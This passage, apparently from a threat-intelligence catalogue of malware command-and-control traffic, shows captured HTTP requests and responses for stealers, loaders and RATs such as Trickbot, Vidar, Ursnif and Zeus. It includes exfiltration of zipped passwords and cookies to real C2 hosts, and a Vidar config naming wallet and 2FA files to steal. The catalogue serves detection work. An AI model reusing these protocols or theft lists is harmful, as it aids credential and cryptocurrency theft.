A..1..8u..S..|...r.....2.9A..).^.....PkS......3...:.	7
|N..u...W_.	c...`.q.]...b...C.....v..z... .`.X...C0B...9..._.;.H.P0.=.....$....e!_.Z..}.y....f+.~-...J...~..Uq8.K.A..Y.,............
.O..f}.....L.|.v.0.4.N e!.a.6#.;......<...a9...,.4.a....F.k...L..j...b.dG...4..w..d/..2..M...C.{0+2&.}.F3g..<:..k.H 9*<.G.@......N.ZE....}..PK........B{.P5X.3_...........History/Mozilla_1.txtUT
.....^...^...^...n.0.E.......D.(......"A.&....)...R.@R..t.....K.$.....Xv)Bs..3.^.^......U#.{_.Q..f..4..R$0v.
.{u...
i.!..[..n....,...2.o....5.n..E...j.MY......4.
Z.w..jj...R...kRg.^I......,.............b.s.U..!l.".V:...R.o......c.. ..t..z]...t........X..'.4.#....p...*.-9^B...2.@.....y@..9a.4.....N?..9.Z.z.~.....'3.....r...
.L.....7..V1.9.?]..3.....G.{..e....5....
.SDO.{.....P.....2....'....|.=.......e..,&~2>....G....W...$...9....".i|6e..<.........G.gA.......%.,J....."F)..$M..d..X..l.8.....h..)%....2...5....
.Y..L...fG......\.Io...6..v.(...s.. .:x
DZ.....{..^7.."..4$<....& .P.#.1.b....r....Lq. I".s..(....m...|.l...PK........D{.P9.......Z.......Information.txtUT
.....^...^...^..Io.0........$......4T.3..A...RC.Xu....Q......aNu..-..f..-......+.#.3k.k.;^..E..V.}./...z.L ....W.,g....q.V3.-..Q.|[Q.eW;...M...;.].3W.]k.i..2..O..\.N..../.S.`.e_.0.... 
^(..A...WP_.-..$..
8A..rI.A..wt...S.+>1z....|<.A..H...G.tb4.t......(.C...^.....q.a4....xmc.z..FI.K%.1L.1..y....y.!!.....6.#.>V..".r....!.Y.-.-.hIEI
....+m.b...8.=Lo&.....#...=.T..J..s.[..C.&.....-..%g.....=,+"....
gr..y...a...d.v.L.PW2....i..J...S.X.&...X..B...........B.v.7.	..`3..9..P.&7..
`$.n.V.4Cv.E...'s.F...V........Ue.....{a..ZT.........M./...r...:i......{
..PK........D{.P..
.s...........General/passwords.txtUT
.....^...^...^.-..R.())(...///.KKLNM....K.......O......K.t(./.	.r.$......@%
.\cS3^......."+......T..R0/1%73O....+..ud..._.....i..PK........D{.P....d...:.......Installed Software.txtUT
.....^...^...^...N.@...1...N.a..B.eE...A1$...]tC....y.......*.d........0..
.D.>`....@..N.Y.q%.>2Z<.../.... .<....Q..4.+;s.jV.J.S..`\.P.f.23...$...-..
...%k2^..gd%.6....Lj....y..B.(..G..L..../*.c..M..Y...v...G..D....J..S....V.....G.V....h.+.3.8....=
.Y.N.....dY(8J...$..4........t3......C..T..=....!.....&.Q.*&.o:.......Q.cR..].v.\..g..l..u.. w..AR...s.;Wmz.yll%....nR
..PK..........@{.P..............	..........A....Outlook/UT......^PK..........@{.Po...?...F.....	...........7...Outlook/Outlook.txtUT......^PK..........@{.P..............	..........A....General/UT......^PK..........@{.P..............	..........A....Cookies/UT......^PK..........@{.P..............	..........A&...History/UT......^PK..........@{.P..............	...........]...Cookies/Chrome_0.txtUT......^PK..........@{.P..+.....s.....	...............Cookies/Mozilla_1.txtUT......^PK..........B{.P5X.3_.........	...............History/Mozilla_1.txtUT......^PK..........D{.P9.......Z.....	...........o...Information.txtUT......^PK..........D{.P..
.s.........	............
..General/passwords.txtUT......^PK..........D{.P....d...:.....	...........~...Installed Software.txtUT......^PK..............'
....
-------------------------------

HTTP/1.1 200 OK
Date: Wed, 27 May 2020 15:26:34 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 0
Connection: keep-alive
CF-Cache-Status: DYNAMIC
cf-request-id: 02f85721270000cc9f0f061200000001
Server: cloudflare
CF-RAY: 59a0c1483f4acc9f-WAW
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/taurus.png "Taurus")
~~~
POST /cfg/ HTTP/1.1
Content-Type: text/html
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 83.0.43.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Host: brightpatio.site
Content-Length: 40
Connection: Keep-Alive
Cache-Control: no-cache

fiiEBkciEbcGGAhDLBzM5vXFT49egBu+n+AowMRW

HTTP/1.1 200 OK
Date: Mon, 03 Aug 2020 17:27:51 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 108
Connection: keep-alive
Set-Cookie: __cfduid=d16b2f3f98d16231a35d4b62af1e52ee61596475671; expires=Wed, 02-Sep-20 17:27:51 GMT; path=/; domain=.brightpatio.site; HttpOnly; SameSite=Lax; Secure
Access-Control-Allow-Origin: *
CF-Cache-Status: DYNAMIC
cf-request-id: 0456f69ca70000bc54ab143200000001
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 5bd1c0743f44bc54-LHR

dMpxOSxhqkNKhUMze/eJIqACe7beduu+j+9JLQ11DUenzvsd2gvDgNl8PCQTAKwmkESu5dQ9jPymvbu8cXUzl2+wy02w7DG+oVxLZh4+wA==
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/taurus1.png "Taurus")

#### tRat
~~~
E6B445EAAE293948E31CD2723392863B9AE4D628D2ECD58BFAD8ADEEACEAD19EFEF9868CD7D1872F8C6B8A3AFE498B14D649A09DFEA687D0D2318C13D1EF8FADF9
CF8B77
CF9C77
D9946ECBD82F2852885EF1501CB5CD2AFBF2C769F1CFF89D
A5EB1BAE
CF896FDFD03355
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/trat.png "tRAt")

#### Trickbot
~~~
GET https://190.154.203.218:449/trg448/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/5/spk/
      << 200 OK 224b
GET http://54.225.92.64/
      << 200 OK 12b
GET https://190.154.203.218:449/trg448/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/0/Windows%207%20x64%20SP1/1075/167.88.7.134/77CAB0693C33C9DA65ECB06B990E1B2A0B60E199332E20B769B1041E6155930A/7FPzmRZqhwAAJvgTcFSqNLk/
      << 200 OK 937b
GET https://190.154.203.218:449/trg448/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/14/user/SYSTEM/0/
      << 200 OK
GET https://190.154.203.218:449/trg448/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/14/path/C:%5CUsers%5CJonathan%5CAppData%5CRoaming%5CnetRest%5C%E4%BB%BB%E3%81%AF%E3%82%A7%E7%A7%81%E3%81%8D%E7%A7%81%E6%8A%B1%E3%81%9F%E3%82%82%E3%81%A1%E6%84%9B.exe/0/
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/trickbot.png "Trickbot")

#### Tvrat Teamviewer RAT
~~~
POST /~f83g7bfiunwjsd1/g4t3_indata.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B150 Safari/604.1
Host: 123faster.top
Content-Length: 121
Cache-Control: no-cache

uuid=3B7B4057-3211-3A57-36E2DD91&id=.1609454960&pass=18c5ft&username=admin&pcname=USER-PC&osver=Windows 7 SP 1&timeout=70

HTTP/1.1 200 OK
Server: nginx/1.14.1
Date: Mon, 03 Feb 2020 21:33:21 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
Strict-Transport-Security: max-age=31536000;

drun_command=0&drun_URL=NULL&rundll_command=0&rundll_URL=NULL&update_command=0&update_URL=NULL&restart_command=0&terminate_command=0&kill_command=0&poweroff_command=0&reboot_command=0&setinterval_command=0&setinterval_time=70
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/tvrat.png "Tvrat")

#### Ursa Loader
~~~
POST /nj41.php HTTP/1.1
Accept: */*
Accept-Language: en-us
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)
Host: 18.217.112.176
Content-Length: 3
Connection: Keep-Alive
Cache-Control: no-cache

q=1HTTP/1.1 200 OK
Date: Fri, 19 Jul 2019 15:17:26 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 5840
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

FHTHSEPHJHWHWHTHWEPHWHJHXIAHRHJEPHSHJIDHYDVDSDVDSDVDSDVDSHHHTHSHXHYEPEPHHGAGMGBEPEPEPFTEPFNFODVDSHHHTHSHXHYEPEPHHGGGBEPEPFTEPERFHERDVDSHHHTHSHXHYEPEPHXGPHTHQHJGVEPEPFTEPERHMHYHYHUFQFFFFFHFOFEFIFHFNFEFHFHFIFEFHFNFMFFHPHXFJHFERDVDSHHHTHSHXHYEPEPHXGPHTHQHJGVGUFIEPEPFTEPERHMHYHYHUFQFFFFFHFOFEFIFHFNFEFHFHFIFEFHFNFMFFHRFFHPHXFJERDVDSHHHTHSHXHYEPEPICHQHNHSHPGDEPEPFTEPERHMHYHYHUFQFFFFFHFOFEFIFHFNFEFHFHFIFEFHFNFMFFERDVDSHHHTHSHXHYEPEPHHGPHFHNIFFHEPFTEPERGAFQHAGSHXHJHWHXHAGNIAHGHQHNHHHAERDVDSHHHTHSHXHYEPEPHHGVGFEPFTEPERFEHSHOFKERDVDSHHHTHSHXHYEPEPHHGVGXEPFTEPERFEIFHNHUERDVDSHHHTHSHXHYEPEPHHGUIAHXFJHWEPFTEPERHPHXFJERDVDSHHHTHSHXHYEPEPHHGQHJHSGJHTHFHIEPFTEPERHUHYHTHRIDERDVDSHHHTHSHXHYEPEPHHGAHMHNHQHJHGHJHFHSHXEPFTEPERFHERDVDSHHHTHSHXHYEPEPICGTHJHWHXHNHTHSEPFTEPERFHERDVDSHHHTHSHXHYEPEPICGTHJHWHXHNHTHSFXHUHUEPFTEPERFHERDVDSHHHTHSHXHYEPEPICGTHJHWHXHNHTHSFX
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ursa.png "Ursa Loader")

#### Ursnif
~~~
POST /images/wsF0B4sp/ZaYjjdVgt73Q1BSOy_2Fofi/qF_2BfPTuK/5Ha_2F0xEvmbSfT_2/FluJ8ZF_2Fx8/g6xkZAZrZwN/2skHgzv92i_2BS/uPf4RDQvATKCgx0GZ5gez/ph_2BLcscLQkKDVw/HGZ6zA6DhGCqgPD/VTX09Q_2FUWIFyWps1/nfJ0I3rIZ/QNKbXjeu7xXa3W_2FZSX/bcWtE2zC4RafXFoRlqL/4EC4YHwclzkXrfX/58a3.bmp HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: multipart/form-data; boundary=36775038942641984568
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Content-Length: 399
Host: shoshanna.at

--36775038942641984568
Content-Disposition: form-data; name="upload_file"; filename="78C6.bin"

\.\..V.]:.o..<]......H..)E.J=x...e%3..U.@.f......].tZ..1....g..OzC.5v.?o.NL...;..)..E.G.a~.....M#;.Cu;N/.3\$....x.....R....e..5.....-mW,..	..C................n.G.|..k0...@...?I.Iu......9k^.U6tzT9.b.3....#..V.4].La....zL.h+...aa..H.D.....Ar.......3.w.<.!.-.....|F9! 3.....7
--36775038942641984568--
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ursnif.png "Ursnif POST")

#### Valak
~~~
GET /project.aspx?cwdTelemetry=2&regclid=bmtiZmE1WlxKXSJfTDVaXEpdIl9MNWluY3xqNTc%2FbDg%2FaTk7PTw1Ym5rODU9PA%3D%3D&agwHit=iniagz&cClass=za&ubwG=hnuhjdlqhguy HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: katedesktop64.com
Connection: Keep-Alive
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/valak.png "Valak")

#### Vidar Stealer
~~~
POST / HTTP/1.1
Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A
Content-Length: 111609
Host: weimachel.net
Connection: Keep-Alive
Cache-Control: no-cache

--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="hwid"

eeeb5d54-7880-42a7-b542-739bbc26cf4b
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="os"

Windows 7 Professional
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="platform"

x64
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="profile"

160
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="user"

admin
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="cccount"

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="fcount"

1
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="telegram"

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="ver"

13.9
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="ccount"

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="logs"; filename="CH_eeeb5d54-7880-42a7-b542-739bbc26cf4b3006040214.zip"
Content-Type: zip

PK........$.HO............#.../Autofill/Google Chrome_Default.txtUT
.....]...]...]..PK........$.HO................/CC/Google Chrome_Default.txtUT
.....]...]...]..PK........$.HOF..`....u...5.../Cookies/cookies_Mozilla Firefox_nltxvmn2.default.txtUT
.....]...]...]..O..0...X.G	......QdFg..G..XI..f....?.R[{.0Unm..U.._..\.f.nEY2S.3..m..?...e........B...'.r..>......P.4..HTQ..H..#.[M..k.R...b.o..d..<$g^..Y......6i.....2.x.....c..-.w..4.....<.....C.\.0q.B.s.m..$E.
...^.D...8..[vJ9c.:....,.J.i!......V....ii.........!.>cz....A..0..@.........Jl. 4.!.R.....".KA.r...w.IT.K).B|......<..P....8..k...y.....Z....Ji
U}...'F.....v.wnu.;.:..a.)...BC...m.Vw.k...I.<.._.]~..0
b..v.&Q@..LH.gSM...fAv&
<......].	...~...{.T....)^..9^......|.=..|.hZ...*7.<h.......Ko8..~.PK........&.HO................/Cookies/Edge_Cookies.txtUT
.....]...]...]..PK........$.HO.'.e........".../Cookies/Google Chrome_Default.txtUT
.....]...]...]..I..P.....Sp.;t...........+..a._?.$....t.R..*U.%I3...)....M. ..x2..S.....S.b...L......d.R...piwR......<~y....AWP..G......P..?.i.....b.'|jz.......&...C.^k.7....d........
..%..tF]..V.g...........T....
M....u..f..<..^..ek/.[...2...P=...3....>.................9J.V&.6..<....f.}......p....{.d..l....!.."...........y.....{N.P....SY.3......V~......z.=....w.o.-j.......$..i&.s]..\...?....*55.f.
...r....#|..NW.EFR......L......fe.
.5..Q.s+...<.... .w..j.....PK........&.HOQ.......F......./Cookies/IE_Cookies.txtUT
.....]...]...].R.n.@.=7...[:]........ .x	`...8$......c..9...J....RRe...w.......,....	..0I.@.... .x...%.....<.].5.........PO\.F...EL..t.he.......x..h..V.c0G0.5%D...P...[m......]8.A."...Av)....J.B..|..D.Eq....8.....f&X......7....nn7.zW]..Y]d#.>O...(.~n....NM...	.".!..`Q&L08XX%....q...=......kVTy.|.lPf.....qm.....t;..~uow....k.@..9..'....i.`.........R.t.{.b......;.9..Pfb.......Tq...}%..s._N.*....	.{._PK........&.HO!...E...j......./cookie_list.txtUT
.....]...]...]U.1
.0..v...?..1.N...C_..C.IB.).O.(...~R..0.....L.x.(:SQ....=~\m.e...PK........$.HO............$.../Downloads/Google Chrome_Default.txtUT
.....]...]...]..PK........0.HO................/Files/Desktop.zipUT
.....]...]...]PK....................PK........4.HO................/Files/Users.zipUT
.....]...]...]PK....................PK........$.HO............".../History/Google Chrome_Default.txtUT
.....]...]...]..PK........$.HO.5..
.......5.../History/history_Mozilla Firefox_nltxvmn2.default.txtUT
.....]...]...]..+.......PK........0.HO..M(.....	....../information.txtUT
~~~
~~~
POST /517 HTTP/1.1
Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A
Content-Length: 25
Host: neroolive.org
Connection: Keep-Alive
Cache-Control: no-cache

--1BEF0A57BE110FD467A--

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 25 Oct 2019 13:27:12 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
Content-Encoding: gzip

1,1,1,1,1,1,1,1,1,1,250,DESKTOP;%DESKTOP%\;*wallet*.*:*2fa*.*:*backup*.txt:*backup*.png:*backup*.jpg:*code*.txt:*code*.png:*code*.jpg:*password*.*:*auth*.txt:*auth*.png:*auth*.jpg:*crypto*.*:*key*.txt:*key*.png:*key*.jpg:*ledger*.*:*metamask*.*:*blockchain*.*:*bittrex*.*:*binance*.*:*coinbase*.*:*trezor*.*:*exodus*.*;300;true;movies:music:mp3;lnk;Exodus;%APPDATA%\Roaming\Exodus;*.*;4000;true;movies:music:mp3;JAXX;%APPDATA%\Roaming\Jaxx;*.*;4000;true;movies:music:mp3;
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-1.png "Vidar")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-2.png "Vidar")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-3.png "Vidar")

#### Vikro Stealer
~~~
GET /getSettings?user_id=WqH4UfHnZ0QYjIVskHWDiQ%3D%3D HTTP/1.1
Host: digicertificator.site
Connection: Keep-Alive

HTTP/1.1 200 OK
Date: Tue, 07 Jul 2020 22:22:56 GMT
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: __cfduid=d5ec32a218aa5e5367539479571aed84a1594160576; expires=Thu, 06-Aug-20 22:22:56 GMT; path=/; domain=.digicertificator.site; HttpOnly; SameSite=Lax; Secure
X-Powered-By: Express
CF-Cache-Status: DYNAMIC
cf-request-id: 03ccf910040000ee5044a20200000001
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Strict-Transport-Security: max-age=0; includeSubDomains; preload
X-Content-Type-Options: nosniff
Server: cloudflare
CF-RAY: 5af4f7933f21ee50-CDG

DQ27u3FPe6q49xyqPW1NUwmiFepfoVnM3+bp29aXA6PnHDet4inH3Uz/amoP29gM60V90JzIDUG/SizOKUEZi4mBEbtN87zR2KNjUri2aTiiEsKLduXshceImkfhLKeeEp4p9ojbbzkhBkER/GMCSZiWOPwiP5u8ioMjwji3vjQFeyDwaUgmS9CoBPikS397afxOj6KAZLrXVH7BILZMzt0/wfmUfz/wsBfHJkJXETD9ZfbNDLCFSDXgQ7Jcf13R5MCnQQzjhUmO/11KJyegRVREt2ZHwKTIwrMaugYNpV18wxNJyUr8TQ5jF1+ch0yj4suoBjyZe12zNl/l1B6LsX189KhqbRc6+y8uefPV1DAGf+VY5+EC2uEj6xjrrni02ft7ofo3tcaoPsJgR8B2PtV1X6a+ggqYbrGqet3ghsqhj5rRfwbR2i+rW/L5eUJApsQTJYE5gRjDqS545Ul4jK/sqosuOqX6fvkWXqrozKNdvrqZf/4goN1pHm3i5/bggRR3sfZ1CZPTZbczHiw6cxU8ud+VR7F7d425drG2SW9lpzyPWeXInNSyS20muadOpWPPTU83wOpQO86eJ0hvYM6CaQaGJtzXXadrqVjbFYw=
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vikro.png "Vikro Stealer")

#### Vjworm vjw0rm
~~~
POST /Vre HTTP/1.1
Accept: */*
Accept-Language: en-us
User-Agent: Laposte_C4BA3647\PC\admin\Microsoft Windows 7 Professional \Not-found\\Yes\FALSE\
Accept-Encoding: gzip, deflate
Host: jihanenouhaila.ddns.net:7773
Content-Length: 0
Connection: Keep-Alive
Cache-Control: no-cache
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vjworm.png "VJworm")

#### VMZeus
~~~
POST /n/file.php HTTP/1.1
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: baloobafoudanitojahdge.space
Content-Length: 133
Connection: Keep-Alive
Cache-Control: no-cache

.qrK.9..z..q.....W.I&....k
..Y..'.LP.....RB....sRZ....].^.G...*e..9.....l.......R..G...F$C.D.)..1...9O!7z.x..?..Qb..A.K.... ..Yu..A..

HTTP/1.1 200 OK
Date: Mon, 21 Oct 2019 12:06:57 GMT
Content-Type: application/octet-stream
Content-Length: 14064
Connection: keep-alive
Set-Cookie: __cfduid=dea0842185ed1d3224d3d743e5e7e7ccd1571659617; expires=Tue, 20-Oct-20 12:06:57 GMT; path=/; domain=.baloobafoudanitojahdge.space; HttpOnly
X-Powered-By: PHP/5.6.40
Cache-Control: public
Content-Disposition: attachment; filename="%2e/files/bolka.xml"
Content-Transfer-Encoding: binary
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 52931bc13d868eb3-DME
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vmzeus.png "VMZeus")

#### ZeroBot
~~~
GET //uploads/b/m/modules.zip HTTP/1.1
Host: darkrat.lh1.in
Connection: Keep-Alive
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/zerobot1.png "zerobot1")

~~~
POST /api/zrcdr77/ HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------8d75c50cdcd2da3
Host: darkrat.lh1.in
Content-Length: 900
Expect: 100-continue
Connection: Keep-Alive


-----------------------------8d75c50cdcd2da3
Content-Disposition: form-data; name="pc"

TEST-PC
-----------------------------8d75c50cdcd2da3
Content-Disposition: form-data; name="type"

err
-----------------------------8d75c50cdcd2da3
Content-Disposition: form-data; name="file"; filename="err.txt"
Content-Type: text/html

ICSharpCode.SharpZipLib.Zip.ZipException: Cannot find central directory
   at ICSharpCode.SharpZipLib.Zip.ZipFile.ReadEntries()
   at ICSharpCode.SharpZipLib.Zip.ZipFile..ctor(Stream stream)
   at ICSharpCode.SharpZipLib.Zip.FastZip.ExtractZip(Stream inputStream, String targetDirectory, Overwrite overwrite, ConfirmOverwriteDelegate confirmDelegate, String fileFilter, String directoryFilter, Boolean restoreDateTime, Boolean isStreamOwner, Boolean allowParentTraversal)
   at Unpacker.Program.Unpack()

-----------------------------8d75c50cdcd2da3--
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/zerobot2.png "zerobot2")

#### Zeus
~~~
GET /panel/config.bin HTTP/1.1
Accept: */*
Connection: Close
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: www.ac-cofan.com
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Fri, 01 Nov 2019 17:19:17 GMT
Server: Apache
Last-Modified: Fri, 01 Nov 2019 12:12:54 GMT
Accept-Ranges: bytes
Content-Length: 34420
Connection: close
Content-Type: application/octet-stream

V*<...5..Z*....,x .RVk...t..pm...M....>=..fD....W....R........"..J....f..........m@3..._.fX..d4i.lXp`.#.....L...b!.]&R~.4/.R.nQ.C7.<...e.jZ
....F...f..0...
........RQ.h..T..?..D.@1W..-.5......!.*....q...Y.z.ZID.(.;....xe.1.l4..Z.q.s......	..4.qCj...t.$b5.qb.S.....!)/W.&.^..#.J..@...}.u..F.84.Q<.`.X.....a..m..^.K6.g.h.....7...^.c.w..nVS.
C8Y.G..........(.^.K.L.....3yG......frO)^..Q$.'f...8db.....o".I,....,.\>.h.w"..`..:.2..@
(.@{........../.*...m...!.
hm...&.P.T$g.
.8D	.X.(.YJ......-~....&E#.#..........YQ.&......0.V.$..A.......
.=W...K..........}.......'.:$.7..Y.....H_{....2........s..........Gi.z...t.
~~~
~~~
POST /panel/gate.php HTTP/1.1
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: www.ac-cofan.com
Content-Length: 376
Connection: Keep-Alive
Cache-Control: no-cache

....Lm...*...sk.eT.NF.';m.
b..t...2
..P..E.....m.=nK...u..7`V..b...%...^..$w..K%......E.....~...g....,.<.V*[.(.........7......g.3p.\..Q".)qU......r....@[:P=...m.o..,?	...5..a..t..j
.\q.....Km..2..k.B..s8.O............
..L........f.f......p..nI..OP....
C..0&.
.....M.....W.~....	%....D........a..I.....4.9.....t.4..j.U..K!!l....z.G.z...r..~YGR......*.....}.	.N......Kd9.......h

HTTP/1.1 200 OK
Date: Fri, 01 Nov 2019 17:19:46 GMT
Server: Apache
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

.U..w..F......_.0p .5.UI..x......MjI............9...?r...<...+..
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/zeus.png "Zeus")

#### zgRAT
~~~
00000000  40 00 00 00                                        @...
00000004  2b 00 00 00 1f 8b 08 00  00 00 00 00 04 00 33 b6   +....... ......3.
00000014  51 51 b5 b7 33 34 36 77  75 76 75 b5 34 b1 74 74   QQ..346w uvu.4.tt
00000024  32 33 77 74 b3 34 33 76  75 75 32 34 70 74 33 75   23wt.43v uu24pt3u
00000034  73 36 77 73 04 2b 02 00  c8 a1 5a d2 2b 00 00 00   s6ws.+.. ..Z.+...
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/zgrat.png "zgRAT")

#### Zyklon Loader
~~~
POST /api/base.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Host: k9147783.beget.tech
Content-Length: 56
Expect: 100-continue

HTTP/1.1 100 Continue

token=5RnK/sSJygaJXP63+AtlH75xbyDcpGtGDwwTAWE07r8=&hwid=HTTP/1.1 200 OK
Server: nginx-reuseport/1.13.4
Date: Wed, 02 Sep 2020 15:30:39 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Connection: keep-alive
Keep-Alive: timeout=30
X-Powered-By: PHP/5.6.40
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/zyklon.png "Zyklon")

### Unknowns
###########################################################################################

#### Unknownbotnet4
hashes:
~~~
e3fd7b57bb830fb083759e2d53dce0b6964985dc65d60b040c956b47f64409df
9201efca328fa5b800a314506d8dddb47ab15e6f47af51331bd0f0e8dff3b70b
ba59f46f684b3602258ce5433c7abbdc016ed4ee1aa2bc8d94520584da63bbc4
3a3da758f7a96401fc3b5ad6392c9286f27fb165054b0dab30257bf28dca6be2
839d301c9ffaf561affa77a913f6bc76498f9df31028a34b967f170fe3e600a5
30d83178f17b86306edd85432b8092ec7b5359aa65245326399f13be43e09553
a64f6c8a28083f8c3701b8377253ba288543a1f0eeb110725e8241fad32db168
8647bcef74d55423bcf1877097a0c732869e29548f74933b1f0a15fce44120ac
32cb69f85ac78e8183be54e8fbc9576a0aa36491e3782f01f59fe57bf4d9fe7a
~~~
~~~
POST /gate.php HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
Accept: */*
User-Agent: 94af05617f4e0479d766f422f611ad5c
Content-Length: 465
Host: smartwaay.xyz:9998

rk=1&aw=%5B%22v1%2E0%2E3705%22%2C%22v1%2E1%2E4322%22%2C%22v2%2E0%2E50727%22%2C%22v3%2E0%22%2C%22v3%2E5%22%2C%22v4%2E0%2E30319%22%5D&ys=C%3A%5CProgram+Files%5CMozilla+Firefox%5Cfirefox%2Eexe&it=1&dw=%5B%22Steven%22%5D&rt=1%2E1%2E0&yj=1&sk=8272244&vt=Intel%28R%29+Core%28TM%29+i7%2D3740QM+CPU+%40+2%2E70GHz&tf=%5B%226%22%2C%221%22%2C%227601%22%2C%22Service+Pack+1%22%2C%22256%22%2C%221%22%2C%220%22%5D&he=0&zo=39874b0c4717a111115c96bcb65bcbdd&fj=&bf=STEVEN%2DACCOUNTI

POST /gate.php HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
Accept: */*
